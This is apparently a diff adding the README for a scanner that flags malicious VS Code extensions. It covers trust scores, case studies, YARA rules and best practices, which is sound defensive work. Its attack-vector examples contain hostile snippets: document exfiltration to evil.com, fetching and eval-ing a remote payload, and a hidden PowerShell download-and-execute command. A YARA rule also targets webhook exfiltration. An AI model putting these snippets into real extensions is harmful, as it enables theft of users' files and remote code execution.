@@ -1,0 +1,243 @@
+Each extension receives a trust score from 0-100:
+
+|Score|Risk Level|Action|
+|--|--|--|
+|80-100|Low Risk|Safe to install|
+|60-79|Medium Risk|Review recommended|
+|40-59|High Risk|Install with Caution|
+|0-39|Critical Risk|Do not install|
+
+Scoring penalties:
+* Critical finding: -35 points
+* High finding: -18 points
+* Medium finding: -8 points
+* Low finding: -3 points
+* Info finding: -1 point
+
+Critical finding: -35 points
+High finding: -18 points
+Medium finding: -8 points
+Low finding: -3 points
+Info finding: -1 point
+
+Detection by Category
+The scanner automatically categorizes extensions and adjusts expectations:
+
+Category	Examples	Expected Behaviors
+AI Assistant	Copilot, Codeium, Kilo Code	Network, process spawn, env access
+Language Support	ms-python, rust-analyzer, Go	Process spawn, dynamic require
+Developer Tools	Code Runner, REST Client, Live Server	Process spawn, network requests
+Remote Development	Remote-SSH, Dev Containers, WSL	SSH, network, process spawn
+Testing	Jest Runner, Test Explorer	Process spawn
+Notebook	Jupyter	Kernel spawn, network
+Debugger	Node Debug, Python Debug	Process spawn
+Linter	ESLint, Prettier	Process spawn
+SCM	GitLens, Git Graph	Git credentials access
+Theme	Color themes, icon themes	Minimal runtime
+🎯 Real-World Attack Prevention
+Case Study 1: MaliciousCorgi Campaign
+The scanner detected MaliciousCorgi (1.5M installs) by identifying:
+
+Hidden iframe: Zero-pixel iframe loading analytics SDKs
+File exfiltration: onDidOpenTextDocument reading entire files
+Base64 encoding: File contents encoded before transmission
+Remote command: getFilesList harvesting up to 50 files
+Analytics SDKs: Zhuge.io, GrowingIO, TalkingData, Baidu Analytics
+Domain blocklist: aihao123.cn
+Case Study 2: Fake ClawdBot Trojan
+Detected by flagging:
+
+Startup activation: onStartupFinished in manifest
+Dynamic fetch: Downloading from C2 server on activation
+ScreenConnect RAT: Known remote access tool signature
+Triple fallback: Multiple delivery mechanisms
+Process execution: child_process.exec() patterns
+Hidden batch script: PowerShell downloader fallback
+🛠️ Extending the Scanner
+Adding Custom YARA Rules
+Create custom_rules.yar:
+
+rule custom_exfil_detection {
+    meta:
+        description = "Custom data exfiltration pattern"
+        severity = "high"
+    strings:
+        $discord_webhook = /discord\.com\/api\/webhooks\/[0-9]+\/[A-Za-z0-9_-]+/
+        $telegram_bot = /api\.telegram\.org\/bot[0-9]+:[A-Za-z0-9_-]+\/sendMessage/
+        $suspicious_fetch = /fetch\s*\(\s*['"](https?:\/\/[^'"]+)/
+    condition:
+        any of them
+}
+Run with custom rules:
+
+ai-plugin-scanner scan --yara-rules ./custom_rules.yar extension.vsix
+Programmatic API
+import { Scanner, JsonReporter, SarifReporter } from 'ai-plugin-scanner';
+
+const scanner = new Scanner();
+const report = await scanner.scan({ ide: 'vscode' });
+
+// Generate JSON report
+const jsonReporter = new JsonReporter();
+console.log(jsonReporter.generate(report));
+
+// Generate SARIF report
+const sarifReporter = new SarifReporter();
+console.log(sarifReporter.generate(report));
+📚 Understanding Attack Vectors
+1. Permission Abuse
+Extensions request permissions beyond their needs:
+
+{
+  "activationEvents": ["*"],  // Runs on every action
+  "main": "./extension.js",
+  "contributes": {
+    "commands": [{
+      "command": "theme.activate",
+      "title": "Activate Theme"
+    }]
+  }
+}
+A theme extension should not have a main entry point or wildcard activation.
+
+2. Obfuscated Code
+Malicious code often uses obfuscation:
+
+const _0x4b4334 = _0x41e2;
+(function(_0x4b4334, _0x2656ab) {
+    const _0x1da43d = function(_0x5b8d73) {
+        while(--_0x5b8d73) {
+            _0x4b4334['push'](_0x4b4334['shift']());
+        }
+    };
+    // ...obfuscated malicious payload
+})();
+3. Data Exfiltration
+Extensions sending data to external servers:
+
+const vscode = require('vscode');
+const https = require('https');
+
+function activate(context) {
+    vscode.workspace.onDidOpenTextDocument((doc) => {
+        const data = Buffer.from(doc.getText()).toString('base64');
+        https.post('https://evil.com/exfil', { data });
+    });
+}
+4. Remote Code Execution
+Dynamic code execution from external sources:
+
+const https = require('https');
+
+function activate(context) {
+    https.get('https://evil.com/payload.js', (res) => {
+        let code = '';
+        res.on('data', chunk => code += chunk);
+        res.on('end', () => eval(code));
+    });
+}
+5. Process Spawning
+Launching external processes:
+
+const { exec } = require('child_process');
+
+function activate(context) {
+    exec('powershell -WindowStyle Hidden -Command "irm https://evil.com/script | iex"', 
+         { windowsHide: true });
+}
+🔐 Best Practices
+For Developers
+Verify publishers: Check for verified badges and established reputation
+Review permissions: Extensions should request minimal necessary permissions
+Inspect source code: Check GitHub repository for transparency
+Check dependencies: Review package.json for suspicious dependencies
+Monitor updates: Be cautious of sudden permission changes
+Use sandboxed environments: Test extensions in isolated containers
+Rotate credentials: After removing suspicious extensions
+For Organizations
+Implement allowlists: Restrict to vetted publishers
+Regular audits: Weekly extension registry scans
+Network monitoring: Block outbound traffic to malicious domains
+Endpoint detection: EDR solutions for file system monitoring
+Educate developers: Security training for extension hygiene
+Log installations: Centralized tracking for incident response
+CI/CD integration: Automated scanning in build pipelines
+🧪 Testing
+# Run test suite
+npm test
+
+# Run with coverage
+npm run test:coverage
+
+# Run specific test file
+npm test -- --grep "obfuscation detection"
+
+# Integration tests
+npm run test:integration
+🤝 Contributing
+We welcome contributions! Please see CONTRIBUTING.md [blocked] for details.
+
+Areas for Contribution
+Additional YARA rules for new malware campaigns
+Support for more IDE marketplaces (JetBrains, Eclipse, etc.)
+Enhanced obfuscation detection algorithms
+Behavioral analysis heuristics
+Performance optimizations
+Documentation and examples
+Adding New IOC Sources
+Create iocs/campaigns/new-campaign.json
+Follow the schema in iocs/schema.json
+Run npm run validate-iocs
+Submit PR with attribution
+📖 Threat Intelligence Sources
+IOCs compiled from public research:
+
+GlassWorm campaign
+Evelyn Stealer
+TigerJack / WhiteCobra coordinated attacks
+OctoRAT distribution
+MUT-9332 (North Korean APT)
+FAMOUS CHOLLIMA
+HardHatRAT
+SnowShoNo, SleepyDuck
+PokemonMiner
+TheseVibesAreOff
+SoliditySquatters
+MaliciousCorgi (1.5M installs)
+Fake ClawdBot Trojan
+ReversingLabs Dec 2025 campaign
+📋 Related Tools
+vsix-audit - Trail of Bits VS Code extension scanner
+IDE-SHEPHERD - Datadog's real-time IDE monitoring
+extension-guard - Multi-IDE security scanner
+Spectra Assure - ReversingLabs marketplace scanner
+VSCan - Web-based extension analyzer
+📄 License
+MIT License
+
+Copyright (c) 2026 [Your Name]
+
+Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+
+🙏 Acknowledgments
+This project builds upon excellent research and tools from:
+
+Trail of Bits (vsix-audit)
+Datadog Security Labs (IDE-SHEPHERD)
+Koi Security (MaliciousCorgi research)
+ReversingLabs (malicious extension research)
+Aikido Security (ClawdBot investigation)
+Microsoft VS Code Team
+📊 Project Status
+This project is actively maintained. See CHANGELOG.md [blocked] for recent updates.
+
+🆘 Support
+Issues: GitHub Issues
+Discussions: GitHub Discussions
+Security vulnerabilities: security@example.com
+Documentation: Wiki
+⚠️ Disclaimer: This tool provides strong protections but cannot guarantee 100% detection. Always follow security best practices and exercise caution when installing extensions or opening untrusted workspaces. No security tool is perfect, and new attack techniques emerge regularly. Use this as part of a comprehensive security strategy.
